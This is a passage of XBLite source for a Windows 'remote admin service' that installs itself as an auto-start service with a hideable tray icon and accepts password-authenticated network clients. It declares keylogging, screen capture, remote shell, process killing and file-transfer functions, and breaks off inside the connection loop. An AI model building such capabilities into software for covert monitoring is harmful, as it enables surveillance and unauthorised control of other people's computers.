

PROGRAM	"server"
VERSION	"0.7"
'MAKEFILE "xexe.xxx"
'CONSOLE

	IMPORT "xst"
	IMPORT "xio_s"
	IMPORT "wsock32"
	IMPORT "kernel32"

	IMPORT "gdi32"
	IMPORT "advapi32"
	IMPORT "msvcrt"
	IMPORT "psapi"
	IMPORT "fs.obj"		' compile fs.x (as library) first to obtain both fs.lib and fs.dll
'	IMPORT "ijl15"		' get library 'intel_jpg_lib.zip' from http://perso.wanadoo.fr/xblite/
						' or http://xblite.xbasic.org/
	IMPORT "ijl15d.dec"
	IMPORT "net.dec"
	IMPORT "p2pfiled.dec"
	IMPORT "user32"
	IMPORT "shell32"
	IMPORT "comctl32"
		

$$SERVICE_WIN32_SHARE_PROCESS	= 32
$$SERVICE_KERNEL_DRIVER	= 1
$$SERVICE_FILE_SYSTEM_DRIVER	= 2

$$SERVICE_BOOT_START	= 0
$$SERVICE_SYSTEM_START	= 1
$$SERVICE_AUTO_START	= 2


$$SERVICE_ERROR_IGNORE	= 0

$$SERVICE_ERROR_SEVERE =	2
$$SERVICE_ERROR_CRITICAL	= 3

$$VK_KANA = 15
$$VK_APPS = 93
$$VK_LWIN = 91
$$VK_RWIN = 92

$$ST_PRESSED = 0
$$ST_DOWN = 1
$$ST_UP = 2

$$WM_ICON_NOTIFY = 1026
$$IDD_DIALOG1 = 101
$$IDI_STANDBY = 103

$$ID_Service_Stop = 40001
$$ID_Service_Remove = 40002
$$ID_Service_Install = 40003
$$ID_Server_Start = 40004
$$ID_Server_Stop = 40005
$$ID_Console_Hide = 40006
$$ID_Console_Show = 40007
$$ID_Icon_Hide = 40008

' QueueMsg access modes
$$QM_WRITE	= 1
$$QM_READ	= 2
$$QM_DELETE	= 3
$$QM_PEEK	= 4
$$QM_INIT	= 5

TYPE TQMSG
	ULONG		 .id
	XLONG		 .socket
	STRING * 256 .msg
END TYPE

$$ServName	= "TService"
$$ServTitle	= "Win32 Server-Client"
$$ServDesc	= "Win32 Server-Client Remote Admin Service"

$$Tree_Dir		 = 0x01
$$Tree_File		 = 0x02
$$Tree_Recursive = 0x04
$$Tree_DirSize	 = 0x08

$$FOF_NOERRORUI	 = 1024

'TYPE PROCESSENTRY32
'	XLONG			.dwSize
	'XLONG			.cntUsage
	'XLONG			.th32ProcessID
	'XLONG			.th32DefaultHeapID
	'XLONG			.th32ModuleID
	'XLONG			.cntThreads
	'XLONG			.th32ParentProcessID
	'XLONG			.pcPriClassBase
	'XLONG			.dwFlags
	'STRING * 260	.szExeFile
'END TYPE

PACKED TLP2P
	TP2P	.fs
	XLONG	.auth
	ULONG	.port
	XLONG	.ret
END TYPE

DECLARE FUNCTION main ()

EXPORT
DECLARE FUNCTION  MAKELONG (lo, hi)
END EXPORT

DECLARE FUNCTION NetInit ()
DECLARE FUNCTION Initialize ()
DECLARE FUNCTION MessagePump (socket,STRING smessage)
DECLARE FUNCTION QueueMsg (accessType,socket,STRING message)
DECLARE FUNCTION DispatchThd1 ()
DECLARE FUNCTION DispatchThd2 ()
DECLARE FUNCTION DispatchThd3 ()
DECLARE FUNCTION DispatchThd4 ()
DECLARE FUNCTION ProcessCommands (socket,STRING message)
DECLARE FUNCTION ProcessCommandB (pmessage)

DECLARE FUNCTION ShutDown ()
DECLARE FUNCTION ShutDownNet ()

DECLARE FUNCTION GetToken (STRING text,STRING token,term)
DECLARE FUNCTION STRING GetTokenEx (STRING text,term,offset)
DECLARE FUNCTION STRING replace (STRING text,oldc,newc)
DECLARE FUNCTION STRING trim (STRING text,char)
DECLARE FUNCTION STRING ConvertLFTo12 (STRING text)
DECLARE FUNCTION STRING GetServerPath ()
DECLARE FUNCTION STRING GetLocalIpA ()
DECLARE FUNCTION STRING GetTime ()
DECLARE FUNCTION STRING GetDate ()
DECLARE FUNCTION STRING GetEnvStrings ()
DECLARE FUNCTION STRING GetComputerName()
DECLARE FUNCTION STRING GetUserName()
DECLARE FUNCTION STRING GetWindowsDir()
DECLARE FUNCTION STRING GetSystemDir()
DECLARE FUNCTION STRING GetDrives()
DECLARE FUNCTION STRING GetDrivesB ()
DECLARE FUNCTION STRING GetProcList ()
DECLARE FUNCTION STRING GetLastErrorStr ()

DECLARE FUNCTION ConnectToServer (STRING address,port)
DECLARE FUNCTION SendBin (socket,pbuffer,size)
DECLARE FUNCTION SendMail (socket,buffer$)
DECLARE FUNCTION SendMsg (socket,buffer$)
DECLARE FUNCTION ListenMail (socket)
DECLARE FUNCTION ListenMsg (socket)

DECLARE FUNCTION ClientCapScr (socket,STRING saveas,quality)
DECLARE FUNCTION ClientProcList (socket)
DECLARE FUNCTION ClientShell (socket,STRING pathname)
DECLARE FUNCTION ClientMailReply (socket)
DECLARE FUNCTION ClientProcKill (socket,pid)
DECLARE FUNCTION ClientPopup (socket,STRING text)
DECLARE FUNCTION ClientStatus (socket)
DECLARE FUNCTION ClientGetKeyLog (socket)
DECLARE FUNCTION ClientGetEventLog (socket)
DECLARE FUNCTION ClientGetEventLogB (socket)
DECLARE FUNCTION ClientStreamKeys (socket,STRING text)
DECLARE FUNCTION ClientEmail (socket,STRING pathname)
DECLARE FUNCTION ClientSysMenu (socket,STRING text)
DECLARE FUNCTION ClientDownload (STRING text)
DECLARE FUNCTION ClientUpload (STRING text)
DECLARE FUNCTION ClientListen (socket,STRING text)
DECLARE FUNCTION ClientGetEnv (socket)
DECLARE FUNCTION ClientTree (socket,STRING msg,STRING dir)
DECLARE FUNCTION ClientNewDir (socket,STRING msg)
DECLARE FUNCTION ClientDelFile (socket,STRING msg)
DECLARE FUNCTION ClientDelDir (socket,STRING msg)
DECLARE FUNCTION ClientDelFiles (socket,STRING msg)
DECLARE FUNCTION ClientRenameFile (socket,STRING msg)
DECLARE FUNCTION ClientRefresh (socket,STRING dir)
DECLARE FUNCTION ClientFileInfo (socket,STRING filename)

DECLARE FUNCTION GetImageArrayInfo (UBYTE image[], bpp, width, height)
DECLARE FUNCTION GetImageType (hImage)					' taken directly as is from the 'xbm' lib
DECLARE FUNCTION GetImage (hImage, UBYTE image[])		' ^^^
DECLARE FUNCTION CaptureScrEx (UBYTE image[])
DECLARE FUNCTION BmpToJPGEx (UBYTE image[],STRING saveas,quality)
DECLARE FUNCTION IJL_DIB_PAD_BYTES (width)

DECLARE FUNCTION Startup()
DECLARE FUNCTION EMail (to$,from$,fromname$,subject$,body$,server$)
DECLARE FUNCTION EMailAlert (pmessage)

DECLARE FUNCTION open_file (pfilename, flags)
DECLARE FUNCTION close_file (file)
DECLARE FUNCTION create_memory_space (totalbytes)
DECLARE FUNCTION free_memory_space (totalbytes)

DECLARE FUNCTION TimerCallback (wtimerid, msg, dwUser, dw1, dw2) 
DECLARE FUNCTION InitTimer ()
DECLARE FUNCTION DestroyTimer ()
DECLARE FUNCTION SetReg (STRING subkey, STRING key, STRING value)
DECLARE FUNCTION NetSleep (time)

DECLARE FUNCTION EventStartRecording ()
DECLARE FUNCTION EventStopRecording ()
DECLARE FUNCTION EventSaveLogExA ()
DECLARE FUNCTION EventSaveLog (STRING log)
DECLARE FUNCTION EventCheck ()
DECLARE FUNCTION EventProcess (vkey,state)

DECLARE FUNCTION OpenEventLog ()
DECLARE FUNCTION AppendEventLog (STRING text)
DECLARE FUNCTION STRING GetEventLog()
DECLARE FUNCTION GetEventLogSize()
DECLARE FUNCTION GetKeyStatus (vkey)

DECLARE FUNCTION LoadString (f$, text$)
DECLARE FUNCTION GetLocalDateAndTime (year, month, day, weekDay, hour, minute, second, nanos)
DECLARE FUNCTION GetCommandLineArguments (total, argv$[])
DECLARE FUNCTION DecomposePathname (pathname$, path$, parent$, filename$, file$, extent$)
DECLARE FUNCTION getLastSlash(str$, stop)
DECLARE FUNCTION IsProcess (STRING name)
DECLARE FUNCTION MAKELANGID (USHORT p, USHORT s)

DECLARE FUNCTION service_ctrl (dwCtrlCode)
DECLARE FUNCTION service_main (dwArgc, lpszArgv)
DECLARE FUNCTION CmdInstallService()
DECLARE FUNCTION CmdRemoveService()
DECLARE FUNCTION CmdRefreshService ()
DECLARE FUNCTION CmdInitService()
DECLARE FUNCTION DialogProc(HWND_hwndDlg,UINT_uMsg,WPARAM_wParam,LPARAM_lParam)
DECLARE FUNCTION ServiceStart(dwArgc, lpszArgv)
DECLARE FUNCTION ServiceStop()
DECLARE FUNCTION ReportStatusToSCMgr(dwCurrentState, dwWin32ExitCode, dwWaitHint)
DECLARE FUNCTION MenuInit (var)
DECLARE FUNCTION SetServDescription (hService,STRING text)
DECLARE FUNCTION RemoveTrayIcon ()
DECLARE FUNCTION StartNetServer(null)
DECLARE FUNCTION StartMenuInit (null)
DECLARE FUNCTION InstallTrayIcon (hWnd)

DECLARE FUNCTION GetAllFilesInDir (socket,STRING msg, STRING dir)
DECLARE FUNCTION FindAllInFolder (socket,STRING msg,mode,STRING location)
DECLARE FUNCTION STRING GetDirSize (socket,STRING dir)
DECLARE FUNCTION STRING textRemove (STRING text,chars,offset)

DECLARE FUNCTION p2pListen (socket)
DECLARE FUNCTION p2pListenBin (socket,size,lpbuffer)
DECLARE FUNCTION p2pCreateBindSocket (STRING address,port,socket)
DECLARE FUNCTION p2pCloseSocket (socket)
DECLARE FUNCTION p2pAccept (socket,STRING remoteaddr)
DECLARE FUNCTION p2pBind (socket,STRING address,port)
DECLARE FUNCTION p2pConnect (STRING address,port,socket)

DECLARE FUNCTION GetIPAddr (STRING name,STRING ip)	' name to ip
DECLARE FUNCTION GetIPName (STRING ip,STRING name)	' ip to name
DECLARE FUNCTION STRING GetModules(processID)

FUNCTION main ()
	STRING cl

	'Xst()
	'Xsx()
	Xio()
	fs()
	#SERVICE_ALL_ACCESS = $$STANDARD_RIGHTS_REQUIRED | $$SERVICE_PAUSE_CONTINUE | $$SERVICE_QUERY_CONFIG | $$SERVICE_CHANGE_CONFIG | $$SERVICE_QUERY_STATUS | $$SERVICE_ENUMERATE_DEPENDENTS | $$SERVICE_START | $$SERVICE_STOP | $$SERVICE_INTERROGATE | $$SERVICE_USER_DEFINED_CONTROL

'	XioCreateConsole ($$ServTitle, 200)

	cl = CSTRING$(GetCommandLineA())
	SELECT CASE TRUE
		CASE INSTRI(cl,"-install")	:CmdInstallService()
		CASE INSTRI(cl,"-remove")	:CmdRemoveService()
		CASE INSTRI(cl,"-refresh")	:CmdRefreshService()
		CASE INSTRI(cl,"-stop")		:ClientShell (0,"net.exe stop "+ $$ServName)
		CASE INSTRI(cl,"-start")	:ClientShell (0,"net.exe start "+ $$ServName)
		CASE INSTRI(cl,"-debug")	:StartMenuInit(0):NetInit(): RemoveTrayIcon ():ShutDown ()

		' service startup
		CASE ELSE					:CmdInitService()
		' standard application startup mode. not a win32 service
		'CASE ELSE					:StartMenuInit(0):NetInit(): RemoveTrayIcon ():ShutDown ()
	END SELECT
	
'	XioFreeConsole ()

END FUNCTION

FUNCTION CmdInitService()
	SERVICE_TABLE_ENTRY DT[]


	ad = &service_main()
	DIM DT[1]
	DT[0].lpServiceName = &$$ServName
	DT[0].lpServiceProc = ULONG (ad)
	DT[1].lpServiceName = 0
	DT[1].lpServiceProc = 0

	IFZ StartServiceCtrlDispatcherA(&DT[]) THEN
		CmdInstallService()
	'	ClientShell (0,"net.exe start "+ $$ServName)
	END IF

END FUNCTION

FUNCTION CmdRefreshService ()

	ClientShell (0,GetServerPath()+" -remove")
	Sleep(5000)
	ClientShell (0,GetServerPath()+" -install")
	Sleep(5000)
	ClientShell (0,"net.exe start "+$$ServName)

END FUNCTION


FUNCTION STRING GetModules(processID)
    XLONG hMods[]
	STRING szModName,buffer,title

 	

    ' Get a list of all the modules in this process.
    hProcess = OpenProcess($$PROCESS_QUERY_INFORMATION | $$PROCESS_VM_READ, 0, processID )
    IFZ hProcess THEN RETURN ""

	DIM hMods[1024]
	cbNeeded = 0

    IF EnumProcessModules (hProcess, &hMods[], SIZE(hMods[]), &cbNeeded) THEN
    	cbNeeded = cbNeeded / 4
    	'PRINT cbNeeded
        FOR i = 0 TO cbNeeded
        	IF hMods[i] THEN
				szModName = SPACE$(256)
				'PRINT i,hMods[i],ret ',LEFT$(szModName,ret)
            	GetModuleFileNameExA (hProcess, hMods[i], &szModName, SIZE(szModName))
            	IF ret THEN
            	'	name = LEFT$(szModName,ret)
              	'  IF name != "" THEN 
				'	buffer = buffer + "\1\2---\t" + LEFT$(szModName,ret)
				END IF
			END IF
        NEXT i
    END IF
    CloseHandle(hProcess)

	RETURN buffer
END FUNCTION 

FUNCTION STRING GetProcList ()
	FUNCADDR pCreateToolhelp32Snapshot (XLONG, XLONG)
	FUNCADDR pProcess32Next (XLONG, XLONG)
	PROCESSENTRY32 proc
	STRING buffer,process


	libHandle = LoadLibraryA(&"kernel32.dll")
	IFZ libHandle THEN RETURN ""

	hpsapi = LoadLibraryA(&"psapi.dll")
	IFZ libHandle THEN RETURN ""

	'GetModuleFileNameExA(HPANDLE,0,&buffer,SIZE(buffer))

	buffer = ""
	tprocess = 0
	pCreateToolhelp32Snapshot = GetProcAddress(libHandle, &"CreateToolhelp32Snapshot")
	IF pCreateToolhelp32Snapshot THEN
		pProcess32Next = GetProcAddress(libHandle, &"Process32Next")
		IF pProcess32Next THEN
			hSnap = @pCreateToolhelp32Snapshot($$TH32CS_SNAPALL, 0)
			IF hSnap THEN
				proc.dwSize = SIZE(proc)
				f = 1
				DO
					f = @pProcess32Next(hSnap, &proc)
					IF f THEN
						INC tprocess
						process = STRING$(proc.th32ProcessID)+"\t"+RTRIM$(proc.szExeFile)
						IFZ buffer THEN
							buffer = buffer + ":"+process  '+ GetModules(proc.th32ProcessID)
						ELSE
							buffer = buffer + "\1\2:"+process '+ GetModules(proc.th32ProcessID)
						END IF
					END IF
				LOOP WHILE f
				buffer = buffer + "\1\2"+STRING(tprocess)+" processes"
			END IF
		END IF
	END IF

	IF hSnap THEN CloseHandle (hSnap)
	IF libHandle THEN CloseHandle (libHandle)
	IFZ buffer THEN buffer = ":unable to acquire process list"
	RETURN buffer
END FUNCTION

FUNCTION IsProcess (STRING name)
	FUNCADDR pCreateToolhelp32Snapshot (XLONG, XLONG)
	FUNCADDR pProcess32Next (XLONG, XLONG)
	PROCESSENTRY32 proc

	
	libHandle = LoadLibraryA(&"kernel32.dll")
	IFZ libHandle THEN RETURN $$FALSE

	pCreateToolhelp32Snapshot = GetProcAddress(libHandle, &"CreateToolhelp32Snapshot")
	IF pCreateToolhelp32Snapshot THEN
		pProcess32Next = GetProcAddress(libHandle, &"Process32Next")
		IF pProcess32Next THEN
			hSnap = @pCreateToolhelp32Snapshot($$TH32CS_SNAPPROCESS, 0)
			IF hSnap THEN
				proc.dwSize = SIZE(proc)
				f = 1
				DO
					f = @pProcess32Next(hSnap, &proc)
					IF f THEN
						IF LCASE$(RTRIM$(proc.szExeFile)) == LCASE$(name) THEN
							CloseHandle (hSnap)
							CloseHandle (libHandle)
							RETURN $$TRUE
						END IF
					END IF
				LOOP WHILE f
			END IF
		END IF
	END IF

	IF hSnap THEN CloseHandle (hSnap)
	IF libHandle THEN FreeLibrary (libHandle)
	
	RETURN $$FALSE
END FUNCTION

FUNCTION STRING GetLastErrorStr ()
	STRING text

	FormatMessageA ($$FORMAT_MESSAGE_FROM_SYSTEM  | $$FORMAT_MESSAGE_ALLOCATE_BUFFER,0, GetLastError(), 0,&hLocal, 0,0)
	LocalLock(hLocal)
	text = RTRIM$(CSTRING$(hLocal))
	LocalFree(hLocal)
	RETURN text
END FUNCTION


FUNCTION MAKELANGID(USHORT p, USHORT s)

	RETURN ((s<<10) | p)
END FUNCTION

FUNCTION MenuInit (lpParameter)
	STATIC dhwnd
	
	dhwnd = CreateDialogParamA (0,$$IDD_DIALOG1,0,0,0)
	DialogBoxParamA (NULL,$$IDD_DIALOG1,dhwnd,&DialogProc(),0)
	RETURN 0
END FUNCTION


FUNCTION service_main (dwArgc, lpszArgv)
	SHARED SERVICE_STATUS ssStatus        '   current status of the service
	SHARED SERVICE_STATUS_HANDLE sshStatusHandle

	
     '   register our service control handler:
	sshStatusHandle = RegisterServiceCtrlHandlerA( &$$ServName, &service_ctrl())

     '   SERVICE_STATUS members that don't change in example
    ssStatus.dwServiceType = $$SERVICE_WIN32_OWN_PROCESS | $$SERVICE_INTERACTIVE_PROCESS
    ssStatus.dwServiceSpecificExitCode = 0

     '   report the status to the service control manager.
    dwErr = 0
    IF (!ReportStatusToSCMgr($$SERVICE_START_PENDING,$$NO_ERROR,3000)) THEN
		IF (sshStatusHandle) THEN
			ReportStatusToSCMgr($$SERVICE_STOPPED,dwErr,0)
			RETURN
		END IF
	END IF

	ServiceStart(dwArgc, lpszArgv)
    
     '   try to report the stopped status to the service control manager.
    IF sshStatusHandle THEN ReportStatusToSCMgr($$SERVICE_STOPPED,dwErr,0)

END FUNCTION


FUNCTION service_ctrl (dwCtrlCode)
	SHARED SERVICE_STATUS ssStatus 
	
     '   Handle the requested control code.
    SELECT CASE dwCtrlCode
        CASE $$SERVICE_CONTROL_STOP:
            ReportStatusToSCMgr($$SERVICE_STOP_PENDING, $$NO_ERROR, 0)
            ServiceStop()
            RETURN
'        CASE $$SERVICE_CONTROL_INTERROGATE:

	END SELECT

    ReportStatusToSCMgr(ssStatus.dwCurrentState, $$NO_ERROR, 0)
END FUNCTION

FUNCTION ReportStatusToSCMgr (dwCurrentState,dwWin32ExitCode, dwWaitHint)
	SHARED SERVICE_STATUS ssStatus        '   current status of the service
	SHARED SERVICE_STATUS_HANDLE sshStatusHandle
	STATIC dwCheckPoint
	
	
    fResult = 1
	dwCheckPoint = 1
	
    IF ( 1 )  THEN '   when debugging we don't report to the SCM

        IF (dwCurrentState == $$SERVICE_START_PENDING) THEN
            ssStatus.dwControlsAccepted = 0
        ELSE
            ssStatus.dwControlsAccepted = $$SERVICE_ACCEPT_STOP
        END IF

        ssStatus.dwCurrentState = dwCurrentState
        ssStatus.dwWin32ExitCode = dwWin32ExitCode
        ssStatus.dwWaitHint = dwWaitHint

        IF ( ( dwCurrentState == $$SERVICE_RUNNING ) || ( dwCurrentState == $$SERVICE_STOPPED ) )
            ssStatus.dwCheckPoint = 0
        ELSE
        	dwCheckPoint = dwCheckPoint + 1
            ssStatus.dwCheckPoint =  dwCheckPoint
        END IF

		' Report the status of the service to the service control manager.
		fResult = SetServiceStatus(sshStatusHandle, &ssStatus)
	END IF

    RETURN fResult
END FUNCTION

FUNCTION CmdInstallService()
    SC_HANDLE   schService
    SC_HANDLE   schSCManager
    STRING szPath


    szPath = GetServerPath()
	IFZ szPath THEN
		ret = GetLastError()
        'PRINT "Unable to install service, module pathname not found:",GetLastErrorStr()
        RETURN ret
    END IF

    schSCManager = OpenSCManagerA (0,0, $$SC_MANAGER_ALL_ACCESS )
    IF schSCManager THEN
        schService = CreateServiceA (schSCManager,&$$ServName,&$$ServTitle,#SERVICE_ALL_ACCESS,$$SERVICE_WIN32_OWN_PROCESS | $$SERVICE_INTERACTIVE_PROCESS, $$SERVICE_AUTO_START, $$SERVICE_ERROR_NORMAL,&szPath, 0, 0, 0, 0, 0)
        IF schService THEN
        '	RegisterServiceProcess
        	SetServDescription (schService,$$ServDesc)
            CloseServiceHandle(schService)

			'PRINT "\nservice installed"
        ELSE
        	ret = GetLastError()
            'PRINT "CreateService failed:",GetLastErrorStr()
        END IF
        
        CloseServiceHandle(schSCManager)
    ELSE
    	ret = GetLastError()
        'PRINT "OpenSCManager failed:",GetLastErrorStr()
	END IF
	
	RETURN ret
END FUNCTION

FUNCTION SetServDescription (hService,STRING text)
	FUNCADDR CSD(XLONG,XLONG,XLONG)
	STATIC hadvapi32Lib
	SERVICE_DESCRIPTION sd



	'IFZ hadvapi32Lib THEN
		hadvapi32Lib = LoadLibraryA (&"advapi32.dll")
		IFZ hadvapi32Lib THEN
			'PRINT "unable to load advapi32.dll:",GetLastErrorStr()
			RETURN 0
		END IF
		
		CSD = GetProcAddress (hadvapi32Lib, &"ChangeServiceConfig2A")
		IFZ CSD THEN
			'PRINT "function not found ChangeServiceConfig2A:",GetLastErrorStr()
			FreeLibrary (hadvapi32Lib)
			hadvapi32Lib = 0
			RETURN 0
		END IF
	
		sd.lpDescription = &text
		@CSD (hService,$$SERVICE_CONFIG_DESCRIPTION,&sd)
	'END IF

	IF hadvapi32Lib THEN
		FreeLibrary (hadvapi32Lib)
		hadvapi32Lib = 0
	END IF
	
	RETURN 1
END FUNCTION

FUNCTION CmdRemoveService()
	SHARED SERVICE_STATUS ssStatus
    SC_HANDLE   schService
    SC_HANDLE   schSCManager
    

    schSCManager = OpenSCManagerA (0, 0,$$SC_MANAGER_ALL_ACCESS )
    IF (schSCManager) THEN
    
        schService = OpenServiceA (schSCManager, &$$ServName, #SERVICE_ALL_ACCESS)
        IF (schService) THEN
             '   try to stop the service
               IF ( ControlService( schService, $$SERVICE_CONTROL_STOP, &ssStatus ) ) THEN
            
                'PRINT "Stopping service."
                Sleep( 1000 )
                DO 
                    IF ( ssStatus.dwCurrentState == $$SERVICE_STOP_PENDING ) THEN
                        'PRINT(".")
                        Sleep( 1000 )
                    ELSE
                        EXIT DO
                    END IF
                    
                LOOP WHILE( QueryServiceStatus( schService, &ssStatus ) )

                IF ( ssStatus.dwCurrentState == $$SERVICE_STOPPED )
                    'PRINT("\nservice stopped.")
                ELSE
                    'PRINT "\nFailed to stop service:",GetLastErrorStr()
                END IF

            END IF

             '   now remove the service
            IF( DeleteService(schService) ) THEN
				'PRINT("service removed.")
			ELSE
				'PRINT "DeleteService failed:",GetLastErrorStr()
				CloseServiceHandle(schService)
			END IF

        ELSE
            'PRINT"OpenService failed",GetLastErrorStr()
        END IF

        CloseServiceHandle(schSCManager)
    ELSE
        'PRINT"OpenSCManager failed:",GetLastErrorStr()
    END IF
    
END FUNCTION

 
 '    FUNCTION: ServiceStart
 '    PURPOSE: Actual code of the service that does the work.
FUNCTION ServiceStart (dwArgc, lpszArgv)
    SHARED hServerStopEvent

    
     '   create the event object. The control handler function signals
     '   this event when it receives the "stop" control code.
    hServerStopEvent = CreateEventA ( 0,1,0,0)    '   no name

     '   report the status to the service control manager.
    IF (!ReportStatusToSCMgr($$SERVICE_RUNNING,$$NO_ERROR,0)) THEN
 		IF (hServerStopEvent) THEN
			CloseHandle(hServerStopEvent)
		END IF
		RETURN
	END IF


	' StartMenuInit(0)
	StartNetServer(0)

	IF (hServerStopEvent) THEN
    	WaitForSingleObject(hServerStopEvent,$$INFINITE)
        CloseHandle(hServerStopEvent)
    END IF
    
END FUNCTION

FUNCTION ServiceStop()
	SHARED hServerStopEvent


 	ShutDown ()
    CLOSE ($$ALL)
    RemoveTrayIcon ()
	XioFreeConsole ()
    IF hServerStopEvent THEN SetEvent(hServerStopEvent)	
END FUNCTION

FUNCTION RemoveTrayIcon ()
	NOTIFYICONDATA ndata
	SHARED hwnd
	SHARED iconStatus


	IF hwnd THEN
		iconStatus = $$FALSE
		ndata.hWnd = hwnd
		ndata.uID = 2000
		Shell_NotifyIconA ($$NIM_DELETE,&ndata)
		RETURN $$TRUE
	ELSE
		RETURN $$FALSE
	END IF
	'PostQuitMessage(0)
	'DestroyMenu (#hPopMenu)
	
END FUNCTION

FUNCTION InstallTrayIcon (hwnd)
	NOTIFYICONDATA ndata
	SHARED iconStatus
	
	ndata.cbSize = SIZE(NOTIFYICONDATA)
	ndata.hWnd = hwnd
	ndata.uID = 2000
	ndata.uFlags = $$NIF_ICON | $$NIF_MESSAGE | $$NIF_TIP
	ndata.uCallbackMessage = $$WM_TRAYICON
	ndata.hIcon = LoadIconA (GetModuleHandleA(0),&"IDI_STANDBY")
	ndata.szTip = "Right click then 'Stop' to Exit"
	Shell_NotifyIconA($$NIM_ADD,&ndata)
	DestroyIcon (ndata.hIcon)
	iconStatus = $$TRUE
		
END FUNCTION

FUNCTION DialogProc (hwndDlg,uMsg,wParam,lParam)
	SHARED hwnd
	USER32_POINT pt
	STATIC cFlag
	SHARED APPLSTATUS
	STATIC WM_TaskbarRestart
	
	
	SELECT CASE uMsg

	CASE $$WM_INITDIALOG:
		WM_TaskbarRestart = RegisterWindowMessageA(&"TaskbarCreated") ' listen for explorer restarts
		InstallTrayIcon (hwndDlg)
		
		#hPopMenu = CreatePopupMenu ()
		AppendMenuA (#hPopMenu, $$MF_STRING,$$ID_Console_Show,&"Show &Console")
		
		IFF APPLSTATUS THEN
			AppendMenuA (#hPopMenu, $$MF_STRING,$$ID_Server_Start,&"S&tart Server")
		ELSE
			AppendMenuA (#hPopMenu, $$MF_STRING,$$ID_Server_Stop,&"S&top Server")
		END IF
		
		AppendMenuA (#hPopMenu, $$MF_SEPARATOR, 0, 0)
		AppendMenuA (#hPopMenu, $$MF_STRING,$$ID_Icon_Hide,&"Hide &Icon")
		AppendMenuA (#hPopMenu, $$MF_STRING,$$ID_Service_Stop,&"&Stop Service")
		AppendMenuA (#hPopMenu, $$MF_STRING,$$ID_Service_Remove,&"&Remove Service")

		ShowWindow (hwndDlg, $$SW_HIDE) ' hide dialog
		SetWindowPos(hwndDlg,NULL,-100,-100,0,0,$$SWP_NOZORDER | $$SWP_NOMOVE)
		hwnd = hwndDlg
		
	CASE WM_TaskbarRestart	: InstallTrayIcon (hwndDlg)
	CASE $$WM_TRAYICON 		:			' taskbar mouse event message
		idIcon = wParam
		mouseMsg = lParam
		SELECT CASE mouseMsg
			CASE $$WM_RBUTTONDOWN   :
				GetCursorPos (&pt)
    			SetForegroundWindow (hwndDlg)
    			TrackPopupMenuEx (#hPopMenu, $$TPM_LEFTALIGN | $$TPM_LEFTBUTTON | $$TPM_RIGHTBUTTON, pt.x, pt.y, hwndDlg, 0)

			CASE $$WM_LBUTTONDOWN   : 
				'ShowWindow (hwndDlg, $$SW_SHOWNORMAL)
				'SetForegroundWindow (hwndDlg)
		END SELECT

	CASE $$WM_COMMAND:
		SELECT CASE wParam
			CASE $$ID_Service_Remove	:ClientShell (0,GetServerPath()+" -remove")
										 ModifyMenuA (#hPopMenu, $$ID_Service_Remove, $$MF_BYCOMMAND | $$MF_STRING | $$MF_POPUP, $$ID_Service_Install, &"Install Service")
			CASE $$ID_Service_Install	:CmdInstallService()
										 ModifyMenuA (#hPopMenu, $$ID_Service_Install, $$MF_BYCOMMAND | $$MF_STRING | $$MF_POPUP, $$ID_Service_Remove, &"Remove Service")
			CASE $$ID_Service_Stop	:ServiceStop()
			CASE $$ID_Server_Start	:IFT StartNetServer(0) THEN
									 	ModifyMenuA (#hPopMenu, $$ID_Server_Start, $$MF_BYCOMMAND | $$MF_STRING | $$MF_POPUP, $$ID_Server_Stop, &"Stop Server")
									 END IF
			CASE $$ID_Server_Stop	:ShutDown()
									 'ModifyMenuA (#hPopMenu, $$ID_Server_Stop, $$MF_BYCOMMAND | $$MF_STRING | $$MF_POPUP, $$ID_Server_Start, &"Start Server")
			CASE $$ID_Console_Hide 	:XioHideConsole()
									 ModifyMenuA (#hPopMenu, $$ID_Console_Hide, $$MF_BYCOMMAND | $$MF_STRING | $$MF_POPUP, $$ID_Console_Show, &"Show Console")
			CASE $$ID_Console_Show 	:IFF cFlag THEN
									 	XioCreateConsole ($$ServTitle, 50)
									 	cFlag = $$TRUE
									 ELSE
									 	XioShowConsole()
									 END IF
									 ModifyMenuA (#hPopMenu, $$ID_Console_Show, $$MF_BYCOMMAND | $$MF_STRING | $$MF_POPUP, $$ID_Console_Hide, &"Hide Console")
			CASE $$ID_Icon_Hide		:RemoveTrayIcon ()
		END SELECT
	CASE ELSE 						:RETURN 0
	END SELECT
	
	RETURN 1
END FUNCTION

FUNCTION StartMenuInit (var)
	STATIC CallOnce
	SHARED hwnd

	IFF CallOnce THEN
		CallOnce = $$TRUE
		_beginthreadex(NULL,0,&MenuInit(),var,0,NULL)
		Sleep (10)
		RETURN $$TRUE
	ELSE
		IF hwnd THEN
			RETURN InstallTrayIcon (hwnd)
		ELSE
			RETURN $$FALSE
		END IF
	END IF

END FUNCTION

FUNCTION StartNetServer(var)
	SHARED APPLSTATUS
	
	IFF APPLSTATUS THEN
    	_beginthreadex  (NULL,0,&NetInit(),var,0,NULL)
    	Sleep (10)
    	RETURN $$TRUE
    ELSE
    	RETURN $$FALSE
    END IF

END FUNCTION

FUNCTION NetInit ()
	STATIC socket
	SHARED client
	SHARED APPLSTATUS
	SHARED CONNECTED
	STRING buffer,auth,ip
	STATIC message$
	XLONG tid

	
	IFF Initialize() THEN
		APPLSTATUS = $$FALSE
		RETURN $$FALSE
	END IF
	
	DO
		ip = GetLocalIpA()
		IF (LEFT$(ip,3) == "127") THEN Sleep (1000)
	LOOP WHILE (LEFT$(ip,3) == "127")
	
	#IPAddr$ = ip
	IFF p2pCreateBindSocket (ip,#Port,@socket) THEN
		ShutDown ()		' unable to bind socket to port
		RETURN $$FALSE
	END IF

	p2pListen (socket)
	auth = "AUTH "+ $$SR_AUTHPASS
	
	DO
		newclient = p2pAccept (socket,@nclientip$)
		IFF APPLSTATUS THEN EXIT DO
		
		buffer = NULL$(SIZE(auth))
		p2pListenBin (newclient,SIZE(auth),&buffer)
		
		IF (buffer == auth) THEN
			IF newclient THEN
				#authok = $$FALSE		' new client has connected, reset auth flag until reauthed
				#StreamKey = $$FALSE	' reset event streaming
				
				IF client THEN
					IFT CONNECTED THEN
						SendMsg (client,"CMSG \1\2*** BYE ***\r\nDISCONNECT")
						CONNECTED = $$FALSE
						p2pCloseSocket (client)
						client = 0
						Sleep (2000)
					ELSE
						CONNECTED = $$FALSE
						p2pCloseSocket (client)
						client = 0
						Sleep (100)
					END IF
				END IF

				#cip$ = nclientip$
				client = newclient
				CONNECTED = $$TRUE

				SendMsg (client,$$SR_AUTHCMD)
				_beginthreadex (NULL, 0,&ListenMsg(), client, 0, &tid)
				Sleep (20)
			END IF
		END IF
